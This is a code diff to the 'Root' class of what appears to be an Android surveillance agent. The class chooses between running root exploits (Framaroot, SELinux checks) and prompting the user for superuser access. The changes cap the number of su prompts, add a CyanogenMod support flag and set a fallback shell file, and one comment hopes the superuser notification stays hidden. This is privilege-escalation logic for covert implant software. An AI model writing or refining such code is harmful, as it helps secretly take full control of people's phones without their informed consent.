@@ -40,6 +40,7 @@ public class Root {
 	private static final String TAG = "Root";
 	public static String method = "";
 	public static Date startExploiting = new Date();
+	private static int askedSu = 0;
 	static public boolean isNotificationNeeded() {
 		if (Cfg.OSVERSION.equals("v2") == false) {
 			int sdk_version = android.os.Build.VERSION.SDK_INT;
@@ -256,7 +257,6 @@ public class Root {
 		if (Status.haveSu() == false) {
 			return;
 		}
-
 
 		// exploit
 		// InputStream stream = resources.openRawResource(R.raw.statuslog);
@@ -564,22 +564,27 @@ public class Root {
 		}
 
 		boolean ask = false;
+		askedSu  += 1;
+		
 		if (Status.haveSu() == true && Status.haveRoot() == false && Keys.self().wantsPrivilege()) {
 			if( checkCyanogenmod() ){
-				ask = true;
+				if (Cfg.SUPPORT_CYANOGENMOD) {
+					ask = true;
+				}
 			} else {
 				ask = !(checkFramarootExploitability() || checkSELinuxExploitability());
 			}
 		}
 
-		if (ask) {
+		if (ask && askedSu <= Cfg.MAX_ASKED_SU ) {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (getPermissions), ask the user");
 			}
-			ask = true;
+			 
 			// Ask the user...
 			Root.superapkRoot();
 
+			// Cyanogen should disable the superuser notification
 			Status.setRoot(PackageInfo.checkRoot());
 
 			if (Cfg.DEBUG) {
@@ -588,13 +593,15 @@ public class Root {
 		} else {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (getPermissions), don't ask");
-			}
+			}	
 		}
 
 		if (Status.haveRoot()) {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + "(getPermissions): Wow! Such power, many rights, very good, so root!");
 			}
+		}else{
+			Configuration.shellFile = Configuration.shellFileBase;
 		}
 
 		// Avoid having the process killed for using too many resources
